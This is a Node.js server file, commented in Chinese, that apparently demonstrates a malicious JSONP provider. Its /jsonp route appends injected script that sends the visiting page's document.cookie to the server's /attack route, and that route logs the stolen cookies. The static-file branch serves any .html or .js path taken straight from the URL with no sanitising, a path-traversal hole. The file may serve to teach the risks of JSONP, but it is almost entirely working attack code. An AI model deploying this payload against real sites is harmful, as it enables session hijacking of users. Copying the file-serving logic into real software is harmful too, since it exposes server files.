/**
 * 提供JSONP服务，并且盗取客户端cookie
 */
const http=require("http");
const fs=require("fs");
const url=require("url");
const querystring=require("querystring");

const server=http.createServer(function (req,res) {
    //请求路径
    let path=decodeURIComponent(url.parse(req.url).pathname);

    switch (path) {
        /**
         * 提供JSONP服务。
         */
        case "/jsonp":
            var param=querystring.parse(url.parse(req.url).search.substring(1));
            var callback=param.callback;
            var data={
                name:"这是JSONP数据",
                result:"你已经被攻击获取到了cookie"
            };
            var retStr=callback+"("+JSON.stringify(data)+");";

            /**
             * 这里插入了恶意代码，获取客户端文档的当前页面所能访问到的cookie信息。
             */
            var attackStr=';new Image().src="http://localhost:8081/attack?cookie="+document.cookie';
            res.setHeader("Content-Type","text/javascript;charset=utf-8");
            res.write(retStr);
            res.write(attackStr);
            res.end();
            break;
        /**
         * 通过图片元素进行跨域请求，从请求字符串的参数字符串中获取到cookie信息。
         */
        case "/attack":
            var param=querystring.parse(url.parse(req.url).search.substring(1));
            var cookie=param.cookie;
            console.log("盗取到的cookie信息",cookie);
            res.end();
            break;
        default:
            if(path.endsWith(".html")){
                let filepath=path.substring(1,path.length);
                fs.readFile(filepath,(error,data)=>{
                    if(error){
                        console.error(error);
                        res.write("404");
                        res.end();
                    }else{
                        res.setHeader('Content-Type', 'text/html;charset=utf-8');
                        res.write(data);
                        res.end();
                    }
                });
            }else if(path.endsWith(".js")){
                let filepath=path.substring(1,path.length);
                fs.readFile(filepath,(error,data)=>{
                    if(error){
                        console.error(error);
                        res.write("404");
                        res.end();
                    }else{
                        res.setHeader('Content-Type', 'text/javascript;charset=utf-8');
                        res.write(data);
                        res.end();
                    }
                });
            }
    }
});

server.listen(8081);